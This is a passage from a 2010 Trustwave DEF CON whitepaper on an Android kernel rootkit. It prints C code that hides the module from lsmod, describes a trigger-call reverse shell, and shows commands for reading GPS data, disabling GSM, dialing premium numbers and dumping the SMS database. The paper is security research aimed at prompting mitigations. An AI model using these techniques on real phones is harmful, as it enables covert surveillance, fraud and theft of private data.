Copyright © 2010 Trustwave. All Rights Reserved. 
A Whitepaper for DEF CON 18, July, 2010 
5.2 Hiding from the user and from the OS 
One drawback of our rootkit is that it leaves a single binary on the filesystem. This is the 
reverse shell binary. We are able to hide the presence of the /data/local/shell binary by 
hijacking the sys_getdents system call which will hide our binary from directory listings. 
Unlike infecting a commodity PC, there are certain challenges with mobiles. One of these is 
persistence. Mobiles are subject to frequent reboots, which mean that we must have a 
mechanism, whereby we re-load the module into the kernel.  
One way of performing this is by inserting the insmod instructions within the init.d scripts. 
Another more elegant method involves infecting existing kernel modules so that the mobile 
device loads them (e.g., when WiFI is turned on the rootkit code executes first). HTC however 
has gone to great lengths to ensure that the partitions which the init.d files are loaded on 
and any modules are read-only. We did not have other devices at hand to investigate whether 
this held true on other devices as well. Therefore, the only form of persistence is re-infection.  
Hiding the presence of the module itself is done as on any other Linux rootkit; the following 
code achieves this:  
static void 
hide_module (void) 
{ 
  __this_module.list.prev->next = __this_module.list.next; 
  __this_module.list.next->prev = __this_module.list.prev; 
  __this_module.list.next = LIST_POISON1; 
  __this_module.list.prev = LIST_POISON2; 
} 
The outcome of this is that the module is hidden from lsmod i.e., it does not appear loaded.  
# lsmod 
# insmod rootkit.ko 
# lsmod 
# 
The next section will describe the implications of all the above and guide the reader through 
some misuse scenarios we tested.  
Trustwave 
- 20 - 
Copyright © 2010 Trustwave. All Rights Reserved. 
A Whitepaper for DEF CON 18, July, 2010 
5.3 Implications 
Calling the rootkitted mobile phone from the trigger number, initiates a reverse TCP over 
WiFI/3G shell to the attacker. From here, he can proceed to interact fully with the Android 
mobile device.  
Some misuse scenarios that we performed successfully were the following: 
1. Retrieve GPS coordinates by querying the GPS subsystem /dev/smd27. 
2. Knock out GSM communication 
3. Initiate phantom calls to potentially premium rate numbers. 
4. Retrieve the SMS database from the phone 
Retrieving GPS coordinates by retrieving NMEA data from /dev/smd27  
# cat /dev/smd27 
$GPGSV,4,1,16,03,02,289,,05,07,035,,06,17,291,,15,,,*43 
$GPGSV,4,2,16,16,45,309,,18,37,150,,21,84,327,,22,13,180,*7F 
$GPGSV,4,3,16,24,42,234,,29,41,077,,30,17,150,,31,18,227,*7F 
$GPGSV,4,4,16,32,,,,28,,,,27,,,,26,,,*74 
$GPGGA,,,,,,0,,,,,,,,*66 
.. 
Switching off  GSM communication: 
echo –e ‘AT+CFUN=0\r’ > /dev/smd0  
Initiating outbound calls to potentially premium-rate numbers:  
echo -e 'ATD02073734844;\r' > /dev/smd0 
A couple of interesting sqlite3 databases: 
./data/com.google.android.providers.gmail/databases/mailstore.user@gmail.com.
db 
./data/com.android.providers.telephony/databases/mmssms.db 
./data/com.android.providers.contacts/databases/contacts2.db 
Trustwave 
- 21 - 
Copyright © 2010 Trustwave. All Rights Reserved. 
A Whitepaper for DEF CON 18, July, 2010 
Retrieving SMS messages: 
# sqlite3 ./data/com.android.providers.telephony/databases/mmssms.db 
SQLite version 3.5.9 
Enter ".help" for instructions 
sqlite> .tables 
addr                 htcmsgs              qtext 
android_metadata     htcthreads           rate 
attachments          incoming_msg         raw 
canonical_addresses  part                 sms 
cbch                 pdu                  sr_pending 
drm                  pending_msgs         threads 
sqlite> select * from sms; 
175|1|145|+44xxxxxx|176|1276176208000|0|1|-
1|1|0||test1|0||+447802000332|0|-1||0 
176|1|0|+447xxxxxx||1276195271967||1|-1|2|||test2|0|||0|-1||0 
177|1|145|+447xxxxx|176|1276195359000|0|1|-
1|1|0||test3|0||+447802000332|0|-1||0 
However this list of misuse scenarios is by no means exhaustive and is limited only by 
imagination and intent.  
Trustwave 
- 22 - 
Copyright © 2010 Trustwave. All Rights Reserved. 
A Whitepaper for DEF CON 18, July, 2010 
6 Conclusions 
In conclusion we have shown that it is possible to write a Linux kernel rootkit for the Google 
Android platform. We have successfully compiled our rootkit called Mindtrick, and hijacked 
system calls. Using system call debugging we have discovered pertinent phone functions that 
we have subsequently hijacked and monitored for certain trigger events.  
Once these trigger events occur, we are able to send an attacker a reverse TCP over WIFI/3G 
shell. From here the attacker has full root access on the device in question. We have 
demonstrated that once full TTY access is obtained, an attacker can proceed to retrieve GPS 
coordinates, knock out GSM communication, initiate phantom calls to potentially premium rate 
numbers and read the SMS database of the phone.  
However this list is by no means exhaustive and is limited only by imagination and intent. We 
are sure that other researchers will be able to perform many additional functions making this 
attack even more practical. Such ideas we have explored, but not implemented have included 
recording calls, Man-in-the-Middle attacks against browser activity, arbitrary recording from 
phone’s microphone or camera, and even strip and retrieve attachments from email messages.  
The only limitation is what the hardware and the operating system allow for at the lowest level.  
This was a technical exploration of what is possible with a popular consumer and business 
device. In the late 1990’s, tools such as Back Orifice were released which resulted in a dramatic 
awakening experience for corporate executives that started to ponder the implications of 
someone with access to their Windows desktops, looking at their files, reading their email, 
evening listening via their PCs microphone. These concerns sparked a massive expansion and 
development of tools to protect environments from such attacks.  
In the late 1990s, smartphones as we know them today did not exist; most consumers didn’t 
own a cellphone. The idea that a person would be walking around with a pocket-sized 
communication device with a persistent high-speed Internet connection with more productivity 
power than PCs of the day was a topic of science fiction.   
Drawing a parallel to the past (and even present day trend in PC malware development), the 
projected rapid growth of the smartphone market, especially the rapid growth of open-source 
phone platforms, means that the criminal element will, in response to the growth and the usage 
profiles of the end user, rapidly begin to attack via these vectors. Such threats call for 
mitigations to be developed to secure the future of mobile computing.  
Trustwave 
- 23 - 
Copyright © 2010 Trustwave. All Rights Reserved. 
A Whitepaper for DEF CON 18, July, 2010 
7 References 
1.	
  Google.	
  Android	
  Architecture.	
  Google	
  Android.	
  [Online]	
  [Cited:	
  06	
  11,	
  2010.]	
http://developer.android.com/guide/basics/what-­‐is-­‐android.html.	
2.	
  Wikipedia.	
  Dalvik	
  (software).	
  Wikipedia.	
  [Online]	
  2010.	
  [Cited:	
  06	
  11,	
  2010.]	
http://en.wikipedia.org/wiki/Dalvik_%28software%29.	
3.	
  Morgan	
  Stanley	
  Research.	
  The	
  Mobile	
  Internet	
  Report.	
  s.l.	
  :	
  Morgan	
  Stanley	
  ,	
  2009.	
4.	
  The	
  mechanics	
  of	
  lawful	
  interception.	
  Gleave,	
  Stephen.	
  5,	
  s.l.	
  :	
  Network	
  Security,	
  2007,	
Vol.	
  2007.	
5.	
  BBC	
  News.	
  UAE	
  Blackberry	
  update	
  was	
  spyware.	
  BBC	
  News.	
  [Online]	
  2009.	
  [Cited:	
  06	
  10,	
2010.]	
  http:/news.bbc.co.uk/2/hi/technology/8161190.stm.	
6.	
  Collin	
  Mulliner,	
  Charlie	
  Miller.	
  Fuzzing	
  the	
  phone	
  in	
  your	
  phone.	
  Las	
  Vegas	
  :	
  Black	
  Hat	
USA	
  2009,	
  2009.	
7.	
  Zovi,	
  Dino	
  Dai.	
  Kernel	
  Rootkits.	
  s.l.	
  :	
  Sandia	
  National	
  Laboratories,	
  2001.	
8.	
  sd,	
  devik.	
  Linux	
  on-­‐the-­‐fly	
  kernel	
  patching	
  without	
  LKM.	
  Phrack.	
  2001,	
  Vol.	
  11,	
  58.	
9.	
  The	
  Linux	
  Documentation	
  Project.	
  The	
  Linux	
  Kernel	
  Module	
  Programming	
  Guide.	
[Online]	
  [Cited:	
  06	
  14,	
  2010.]	
  http://tldp.org/LDP/lkmpg/2.6/html/x380.html.	
10.	
  ETSI.	
  AT	
  command	
  set	
  for	
  User	
  Equipment.	
  Paris	
  :	
  s.n.,	
  2010.